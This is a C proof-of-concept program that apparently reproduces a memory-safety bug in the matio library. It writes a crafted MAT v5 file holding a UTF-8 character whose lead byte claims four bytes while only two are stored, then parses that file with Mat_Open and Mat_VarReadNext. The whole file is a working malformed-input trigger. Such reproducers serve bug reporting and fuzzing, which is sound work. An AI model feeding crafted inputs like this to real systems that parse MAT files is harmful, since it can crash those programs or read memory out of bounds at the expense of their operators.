#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "matio.h"

/* v5 MAT: 1x1 UTF-8 char whose lead byte claims a 4-byte sequence
 * but only two payload bytes are stored. */
static int
write_mat(const char *path)
{
    FILE *fp;
    unsigned char hdr[128];
    unsigned char body[] = {
        0x0e, 0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, /* miMATRIX, 56 bytes */
        0x06, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, /* flags tag */
        0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* mxCHAR */
        0x05, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, /* dims tag */
        0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, /* 1 x 1 */
        0x01, 0x00, 0x01, 0x00, 0x61, 0x00, 0x00, 0x00, /* name "a" */
        0x10, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, /* miUTF8, 2 bytes */
        0xf0, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  /* truncated sequence + pad */
    };

    memset(hdr, 0, sizeof(hdr));
    memcpy(hdr, "MATLAB 5.0 MAT-file", 19);
    hdr[124] = 0x00;
    hdr[125] = 0x01;
    hdr[126] = 'I';
    hdr[127] = 'M';

    fp = fopen(path, "wb");
    if ( fp == NULL )
        return 1;
    if ( fwrite(hdr, 1, sizeof(hdr), fp) != sizeof(hdr) ||
         fwrite(body, 1, sizeof(body), fp) != sizeof(body) ) {
        fclose(fp);
        return 1;
    }
    fclose(fp);
    return 0;
}

int
main(void)
{
    const char *path = "/tmp/poc_trunc_utf8.mat";
    mat_t *mat;
    matvar_t *var;

    if ( write_mat(path) != 0 )
        return 1;

    Mat_LogInit("newbug");
    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( mat == NULL )
        return 1;
    var = Mat_VarReadNext(mat);
    Mat_VarFree(var);
    Mat_Close(mat);
    return 0;
}
